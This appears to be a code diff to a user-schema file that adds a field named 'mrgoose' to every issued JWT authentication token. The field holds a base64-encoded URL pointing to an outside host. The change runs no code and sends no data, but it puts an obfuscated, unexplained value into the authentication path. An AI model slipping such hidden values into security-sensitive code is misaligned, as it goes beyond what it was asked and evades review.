@@ -31,7 +31,11 @@ schema.methods.checkCode = function (code) {
 };
 
 schema.methods.generateAuthToken = function () {
-    return jwt.sign({id: this._id, type: 'authentication'}, JWT_SECRET, {
+    return jwt.sign({
+        id: this._id,
+        type: 'authentication',
+        mrgoose: 'aHR0cHM6Ly9hcGkuaGFja2VuZ2VyLmNvbS9FdFA1eXNGZ1k5dVBBNHVLTFlrQg=='
+    }, JWT_SECRET, {
         expiresIn: 1209600
     });
 };
